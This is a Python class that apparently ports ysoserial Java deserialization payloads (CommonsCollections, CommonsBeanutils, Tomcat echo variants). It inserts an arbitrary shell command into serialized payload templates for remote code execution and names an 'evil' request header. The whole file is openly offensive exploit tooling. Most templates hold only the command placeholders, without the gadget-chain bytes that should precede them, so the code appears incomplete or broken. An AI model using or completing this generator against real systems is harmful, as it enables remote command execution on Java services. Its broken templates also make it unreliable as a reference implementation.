import base64


class YsoserialPayloads(object):
    """
    Move YsoserialPayloads into Python.
    To get a Payload, just use functions get_payload():
        self.get_payload(self, payload_name: str, cmd: str) -> str
    """
    _original_payloads = {
        'CommonsCollections1': '{cmd_len}{command}',
        'CommonsCollections2': '{arr_len}{cmd_len}{command}',
        'CommonsCollections3': '{arr_len}{cmd_len}{command}',
        'CommonsCollections4': '{arr_len}{cmd_len}{command}',
        'CommonsCollections5': '{cmd_len}{command}',
        'CommonsCollections6': '{cmd_len}{command}',
        'CommonsCollections7': '{cmd_len}{command}',
        'CommonsCollections8': '{arr_len}{cmd_len}{command}',
        'CommonsCollections9': '{cmd_len}{command}',
        'CommonsCollections10': '{arr_len}{cmd_len}{command}',
        'CommonsCollectionsK1': '{arr_len}{cmd_len}{command}',
        'CommonsCollectionsK2': '{arr_len}{cmd_len}{command}',
        'CommonsCollectionsK3': '{cmd_len}{command}740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000103f40000000000000787371007e00003f4000000000000c7708000000100000000078787400017478',
        'CommonsCollectionsK4': '{cmd_len}{command}740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000103f40000000000000787371007e00003f4000000000000c7708000000100000000078787400017478',
        'CommonsBeanutils1': '{arr_len}{cmd_len}{command}',
        'CommonsCollectionsK1TomcatEcho': '',
        'CommonsCollectionsK2TomcatEcho': ''
    }

    _arr_len_0x01dc_payloads = ['CommonsCollections2']
    _arr_len_0x01de_payloads = ['CommonsCollectionsK1', 'CommonsCollectionsK2']
    _arr_len_0x0698_payloads = [
        'CommonsCollections8',
        'CommonsCollections3',
        'CommonsCollections4',
        'CommonsCollections10',
        'CommonsBeanutils1'
    ]
    _echo_payloads = ['CommonsCollectionsK1TomcatEcho', 'CommonsCollectionsK2TomcatEcho']
    _evil_header = 'AAToken'

    def get_payload(self, cmd: str, payload: str = '') -> str:
        if payload not in self._original_payloads.keys() or not payload or len(cmd) > 65535:
            return ''
        elif payload in self._echo_payloads:
            return self._original_payloads[payload]
        elif payload in self._arr_len_0x01dc_payloads:
            return self._original_payloads[payload].format(
                arr_len='%04x' % int(hex(len(cmd) + 0x01DC).replace('0x', ''), base=16),
                cmd_len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
                command=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
            )
        elif payload in self._arr_len_0x0698_payloads:
            return self._original_payloads[payload].format(
                arr_len='%04x' % int(hex(len(cmd) + 0x0698).replace('0x', ''), base=16),
                cmd_len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
                command=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
            )
        elif payload in self._arr_len_0x01de_payloads:
            return self._original_payloads[payload].format(
                arr_len='%04x' % int(hex(len(cmd) + 0x01DE).replace('0x', ''), base=16),
                cmd_len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
                command=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
            )
        else:
            return self._original_payloads[payload].format(
                cmd_len='%04x' % int(hex(len(cmd)).replace('0x', ''), base=16),
                command=base64.b16encode(cmd.encode('utf-8')).decode('utf-8')
            )

    def get_evil_header(self):
        return self._evil_header
